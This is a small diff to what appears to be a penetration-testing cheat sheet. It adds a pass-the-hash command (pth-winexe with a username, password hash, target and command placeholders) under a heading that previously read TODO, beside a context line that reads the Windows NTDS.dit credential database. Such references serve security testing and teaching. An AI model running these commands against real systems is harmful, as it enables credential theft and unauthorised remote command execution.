@@ -727,7 +727,8 @@ cmd> type C:\Windows\NTDS\NTDS.dit
 
 ### Pass The Hash
 
+Pass-the-Hash
 ```
-TODO
+$ pth-winexe -U [username]%[password_hash] //[target] [command_to_exec]
 ```
 
